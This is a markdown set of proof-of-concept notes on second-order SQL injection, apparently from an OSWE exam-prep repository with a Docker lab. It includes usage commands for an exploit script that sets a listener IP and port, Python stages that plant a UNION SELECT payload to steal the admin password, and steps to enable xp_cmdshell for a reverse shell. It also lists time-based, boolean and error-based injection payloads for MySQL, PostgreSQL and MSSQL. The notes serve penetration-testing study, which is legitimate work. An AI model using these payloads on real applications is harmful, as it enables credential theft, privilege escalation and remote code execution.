## Docker lab

Preferred setup: `cd labs && ./labctl.sh up` (see [`lab/README.md`](lab/README.md) and [`labs/README.md`](../../labs/README.md)).

---

# Second-Order SQL Injection PoC Notes

## Vulnerability Summary
- **Target**: Applications with SQL injection in stored data
- **Type**: Second-Order SQLi → Data exfiltration/RCE
- **Impact**: Privilege escalation, data theft, RCE

## Key Concepts
Unlike first-order SQLi, the payload is stored in the database during one operation and executed in a different context later (often with higher privileges).

## Attack Flow
```
1. User Registration (Low Priv)
   → POST /register
   → Payload stored in database

2. Admin Operation (High Priv)
   → Admin views user list / searches
   → Query constructed with stored data
   → SQLi executes with admin context!

3. Exploitation
   → Data exfiltration OR
   → xp_cmdshell / file write / RCE
```

## Quick Usage
```bash
# Basic exploitation
python3 poc_second_order_sqli.py \
  --target-ip 192.168.1.10 \
  --target-port 80 \
  --listening-ip 10.10.14.5 \
  --listening-port 4444

# With Burp proxy for debugging
python3 poc_second_order_sqli.py \
  --target-ip 192.168.1.10 \
  --proxy http://127.0.0.1:8080 \
  --verbose

# Custom delay for slow connections
python3 poc_second_order_sqli.py \
  --target-ip 192.168.1.10 \
  --delay 5
```

## Exploit Stages

### Stage 1: Registration with Payload
```python
payload = "test' UNION SELECT password FROM admin--"
data = {
    "username": "attacker",
    "email": "att@cker.com",
    "bio": payload  # Payload stored in DB
}
requests.post(f"{target}/register", data=data)
```

### Stage 2: Trigger via Admin Search
```python
# When admin searches, stored payload executes
search_term = "test"  # Matches registration data
response = admin_session.get(f"{target}/admin/search?q={search_term}")
# Response contains admin password!
```

### Stage 3: Exploit with Admin Access
```python
# Login as admin
# Enable xp_cmdshell (MSSQL) or file_write (MySQL)
# Execute reverse shell
```

## OSWE Exam Tips

### Detection
- Look for stored user input: registration, profile updates, comments
- Identify trigger points: admin panels, searches, exports, reports
- Use time-based detection first (SLEEP, WAITFOR DELAY)

### Exploitation Strategy
1. **Register multiple users** with different payloads
2. **Monitor all admin endpoints** for trigger opportunities
3. **Higher privileges** in trigger context allow:
   - xp_cmdshell (MSSQL)
   - INTO OUTFILE (MySQL)
   - COPY TO PROGRAM (PostgreSQL)

### Common Injection Points
- User profiles (bio, address, company)
- Product reviews/comments
- File metadata (uploaded_by, description)
- Email templates
- Export/Report generation

## Time-Based Detection Payloads

### MySQL
```sql
' OR (SELECT * FROM (SELECT(SLEEP(5)))a) OR '
```

### PostgreSQL
```sql
' OR (SELECT pg_sleep(5)) OR '
```

### MSSQL
```sql
' OR (WAITFOR DELAY '0:0:5') OR '
```

## Data Extraction Payload

### MySQL (Boolean-based)
```sql
' OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>57--
```

### MSSQL (Error-based)
```sql
' OR 1/@@VERSION--
```

## References
- PortSwigger: https://portswigger.net/kb/issues/00100210_sql-injection-second-order
- Pentest Blog: https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
